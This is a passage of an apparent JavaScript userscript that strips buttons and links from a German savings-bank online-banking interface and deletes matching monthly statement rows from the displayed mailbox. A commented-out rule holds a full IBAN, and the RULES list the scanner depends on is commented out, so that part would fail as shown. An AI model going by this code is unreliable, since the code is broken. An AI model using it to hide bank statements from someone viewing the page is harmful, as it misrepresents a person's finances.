        'Druckansicht (Finanzenübersicht)',
        config.removeFinueberDruckansicht,
        { queryType: 'title' }
    );

    tryRemove(
        'tour-sorting-waypoint',
        'Tour Sorting Waypoint',
        config.removeFinueberSortingWaypoint,
        { queryType: 'data' }
    );

    tryRemove(
        'mkp-button mkp-button-tertiary mkp-button-tertiary-m mkp-icon-svg mkp-icon-left mkp-icon-info-circle-s',
        'Info circle button',
        config.removeFinueberInfoCircleButton
    );

    tryRemove(
        'is-prognose',
        'Prognose marker',
        config.removeFinueberPrognose
    );

    // Kontodetails (shadow-aware)
    tryRemove(
        'Karten verwalten',
        'Karten verwalten button',
        config.removeKontodetailsKartenVerwalten,
        { queryType: 'title', useShadow: true }
    );

    tryRemove(
        'Online-Banking-Limit verwalten',
        'Limit verwalten button',
        config.removeKontodetailsLimitVerwalten,
        { queryType: 'title', useShadow: true }
    );

    tryRemove(
        'Kontoauszüge nacherstellen',
        'Parent of Kontoauszüge nacherstellen',
        config.removeKontodetailsKontoauszugParent,
        { queryType: 'title', getParent: true, useShadow: true }
    );

    tryRemove(
        'Zur Abrechnungsauskunft',
        'Parent of Abrechnungsauskunft',
        config.removeKontodetailsAbrechnungsauskunftParent,
        { queryType: 'title', getParent: true, useShadow: true }
    );

    tryRemove(
        'Zum Kontowecker',
        'Parent of Kontowecker',
        config.removeKontodetailsKontoweckerParent,
        { queryType: 'title', getParent: true, useShadow: true }
    );

    tryRemove(
        'Druckansicht',
        'Druckansicht (Kontodetails inside shadow root)',
        config.removeKontodetailsDruckansichtShadow,
        { queryType: 'title', useShadow: true }
    );
};

setInterval(checkElements, CHECK_INTERVAL_MS);

}

 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';

  /*** Configuration ***/
  // Scan interval (ms)
  const INTERVAL_MS = 200;

  // If false => case-insensitive substring checks
  const CASE_SENSITIVE = false;

//  // Your rule sets: a row is removed if it matches ALL enabled texts in ANY set.
//  const RULES = [
//    [
//      { text: 'Kontoauszug', use: true },
//      { text: '8/2025',      use: true },
//      { text: 'DE12 8605 5592 1898 4092 06', use: false },
//    ],
// [
//      { text: 'Kontoauszug', use: true },
//      { text: '9/2025',      use: true },
//      { text: 'DE12 8605 5592 1898 4092 06', use: false },
//    ],
//       [
 //     { text: 'Kontoauszug', use: true },
//      { text: '10/2021',      use: true },
//      { text: 'DE12 8605 5592 1898 4092 06', use: false },
//    ],
//    // Add more rule sets as needed:
//    // [
//    //   { text: 'AnotherWord', use: true },
//    //   { text: 'ExtraWord',   use: false },
//    // ],
//  ];

  /*** Helpers ***/
  const norm = (s) => (CASE_SENSITIVE ? String(s ?? '') : String(s ?? '').toLowerCase());
  const enabledTexts = (set) => set.filter(r => r && r.use && typeof r.text === 'string').map(r => r.text);

  function rowMatchesAnyRuleSet(rowText) {
    const hay = norm(rowText);
    if (!hay) return false;

    for (const set of RULES) {
      const needles = enabledTexts(set).map(norm);
      if (needles.length === 0) continue;

      // Row matches a set if it contains ALL enabled texts in that set
      const allFound = needles.every(word => hay.includes(word));
      if (allFound) return true;
    }
    return false;
  }

  // Get all target rows under elements with class="btableblock mkp-table"
  function getTargetRows() {
    // Covers: <table class="btableblock mkp-table"> ... or any container with those classes
    const containers = document.querySelectorAll('.btableblock.mkp-table');
    const rows = [];
    containers.forEach(c => {
      // prefer tbody > tr, but also catch stray tr
      rows.push(...c.querySelectorAll('tbody > tr, tr'));
    });
    return rows;
  }

  function removeMatchingRowsOnce() {
    try {
      const rows = getTargetRows();
      if (!rows.length) return;

      let removedCount = 0;

      for (const tr of rows) {
        // Skip header rows inside THEAD just in case
        if (tr.closest('thead')) continue;

        const text = tr.textContent || '';
        if (rowMatchesAnyRuleSet(text)) {
          tr.remove();
          removedCount++;
        }
      }

      if (removedCount > 0) {
        console.log(`[spar postfach] Removed ${removedCount} matching row(s).`);
      }
    } catch (err) {
      console.error('[spar postfach] Error while removing rows:', err);
    }
  }

  function startScanner() {
    // Run immediately once DOM is interactive/ready, then every INTERVAL_MS
    removeMatchingRowsOnce();
    setInterval(removeMatchingRowsOnce, INTERVAL_MS);
    console.log('[spar postfach] Scanner started.');
  }

  // Start as early as possible but ensure DOM exists
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startScanner, { once: true });
  } else {
    startScanner();
  }
}


